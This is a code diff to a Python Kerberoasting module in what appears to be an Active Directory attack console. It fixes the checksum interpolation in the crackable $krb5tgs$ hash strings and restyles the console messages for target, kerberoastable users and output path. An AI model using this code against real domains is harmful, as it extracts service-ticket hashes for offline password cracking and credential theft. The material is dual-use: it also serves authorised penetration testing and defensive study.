@@ -113,12 +113,12 @@ class Kerberoasting:
         if etype == constants.EncryptionTypes.rc4_hmac.value or etype == constants.EncryptionTypes.des_cbc_md5.value:
             checksum = hexlify(cipher_octets[:16]).decode()
             data = hexlify(cipher_octets[16:]).decode()
-            entry_format = f"$krb5tgs${etype}$*{username}${realm}${spn}*$checksum${data}"
+            entry_format = f"$krb5tgs${etype}$*{username}${realm}${spn}*${checksum}${data}"
             
         elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value or etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             checksum = hexlify(cipher_octets[-12:]).decode()
             data = hexlify(cipher_octets[:-12]).decode()
-            entry_format = f"$krb5tgs${etype}${username}${realm}$*{spn}*$checksum${data}"
+            entry_format = f"$krb5tgs${etype}${username}${realm}$*{spn}*${checksum}${data}"
         else:
             return f"[red][!][/] Unsupported encryption type: {etype}"
         
@@ -148,14 +148,15 @@ class Kerberoasting:
             console.print("[red]Usage:[/] kerberoasting <target>")
             return
         
-        console.print(f'\n[green][+][/] Target: {self.get_machine_name(con_input)}')
+
+        console.print(f"- [cyan]Target[/]: {self.get_machine_name(con_input)}", highlight=False)
         kerberoastable_users = self.get_kerberoastable_users(con_input)
 
         if not kerberoastable_users:
             console.print(f'[red][!][/] No kerberoastable users found')
             return
 
-        console.print(f'[green][+][/] Kerberoastable Users: {kerberoastable_users}')
+        console.print(f"- [cyan]Kerberoastable Users[/]: {kerberoastable_users}", highlight=False)
 
         domain = get_domain()
         my_username = get_username()
@@ -183,4 +184,4 @@ class Kerberoasting:
             except Exception as e:
                 console.print(f"[red][!][/] Exception during TGS request for {spn}: {str(e)}")
 
-        console.print(f"[green][+][/] Output saved to: {get_current_profile_path()}/{random_uuid}_kerberoasting.txt", highlight=False)
+        console.print(f"- [cyan]Output saved in[/]: {get_current_profile_path()}/{random_uuid}_kerberoasting.txt", highlight=False)
